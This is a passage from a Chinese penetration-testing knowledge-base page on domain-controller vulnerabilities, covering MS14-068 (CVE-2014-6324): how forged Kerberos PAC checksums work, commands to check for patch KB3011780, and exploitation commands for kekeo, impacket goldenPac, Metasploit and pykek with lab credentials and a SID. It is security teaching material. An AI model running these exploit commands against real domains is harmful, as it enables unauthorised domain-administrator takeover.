<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/内网渗透/横向移动/域控相关漏洞" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">域控相关漏洞 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/域控相关漏洞"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="域控相关漏洞 | d4m1ts 知识库"><meta data-rh="true" name="description" content="CVE-2014-6324（MS14-068）"><meta data-rh="true" property="og:description" content="CVE-2014-6324（MS14-068）"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/域控相关漏洞"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/域控相关漏洞" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/域控相关漏洞" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml">

<link rel="preconnect" href="https://hm.baidu.com">
<script src="https://hm.baidu.com/hm.js?3675030a9721336abea8cd0e46b3f76b" async></script>
<script>window._hmt||(window._hmt=[])</script><link rel="stylesheet" href="/assets/css/styles.49fd3b7f.css">
<script src="/assets/js/runtime~main.89a5e072.js" defer="defer"></script>
<script src="/assets/js/main.3f9bb996.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="navbar__items navbar__items--right"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">在线Markdown</a><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Reverse Shell Generator</a><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GTFOBins</a><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="展开侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内网基础知识">内网基础知识</a><button aria-label="展开侧边栏分类 &#x27;内网基础知识&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/信息收集">信息收集</a><button aria-label="展开侧边栏分类 &#x27;信息收集&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内网穿透">内网穿透</a><button aria-label="展开侧边栏分类 &#x27;内网穿透&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/横向移动">横向移动</a><button aria-label="折叠侧边栏分类 &#x27;横向移动&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/横向移动">横向移动</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/Hash传递">Hash传递</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/NTLM_Relay">NTLM_Relay</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/域控相关漏洞">域控相关漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/exchange相关漏洞">exchange相关漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/已知账号密码横向">已知账号密码横向</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/权限维持">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/日志清理">日志清理</a><button aria-label="展开侧边栏分类 &#x27;日志清理&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/工具小结">工具小结</a><button aria-label="展开侧边栏分类 &#x27;工具小结&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/渗透技巧">渗透技巧</a><button aria-label="展开侧边栏分类 &#x27;渗透技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/渗透测试/"><span itemprop="name">渗透测试</span></a><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">内网渗透</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/横向移动"><span itemprop="name">横向移动</span></a><meta itemprop="position" content="3"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">域控相关漏洞</span><meta itemprop="position" content="4"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>域控相关漏洞</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2014-6324ms14-068">CVE-2014-6324（MS14-068）<a href="#cve-2014-6324ms14-068" class="hash-link" aria-label="CVE-2014-6324（MS14-068）的直接链接" title="CVE-2014-6324（MS14-068）的直接链接">​</a></h2>
<p>MS14-068 (CVE-2014-6324) 是微软于 2014 年 11 月发布的补丁 (KB3011780) 中修复的一个漏洞，该漏洞允许攻击者以任意用户的权限提升到域管理员帐户权限，漏洞影响 <code>Windows Server 2003</code> 到 <code>Windows Server 2012 R2</code> 期间的 Windows 版本</p>
<p>该漏洞最本质的地方在于**Microsoft Windows Kerberos KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名，导致用户可以自己构造一张PAC。 **</p>
<p>在 KDC 对 PAC 进行验证时，对于 PAC 尾部的签名算法，本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，但微软在实现上，却允许任意checksum算法，包括MD5，因此只需要把篡改后的 PAC 进行MD5，就可以生成新的校验和，再指定签名算法为MD5，KDC 就会使用指定的MD5算法进行签名验证，也就达到了伪造PAC的目的。</p>
<p><strong>漏洞自查：</strong></p>
<p>若是受影响的 Windows 版本，漏洞自检可在域控命令查询是否打补丁：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">findstr </span><span class="token string" style="color:#e3116c">&quot;KB3011780&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wmic qfe GET hotfixid </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">findstr </span><span class="token string" style="color:#e3116c">&quot;KB3011780&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><strong>漏洞利用：</strong></p>
<ul>
<li>kekeo</li>
</ul>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kekeo.exe </span><span class="token string" style="color:#e3116c">&quot;exploit::ms14068 /domain:org.gm7 /user:d4m1ts /password:KsadiN8A.as221 /sid:S-1-5-21-1878822121-1315641291-3131639831-1108 /ptt&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>impacket</li>
</ul>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 goldenPac.py -dc-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 -target-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 org.gm7/d4m1ts:KsadiN8A.as221@PDC.org.gm7</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>msf</li>
</ul>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="noopener noreferrer">pykek</a></li>
</ul>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python ms14-068.py </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> d4m1ts@org.gm7 </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> KsadiN8A.as221 </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> S-1-5-21-1878822121-1315641291-3131639831-1108 </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> PDC.org.gm7</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 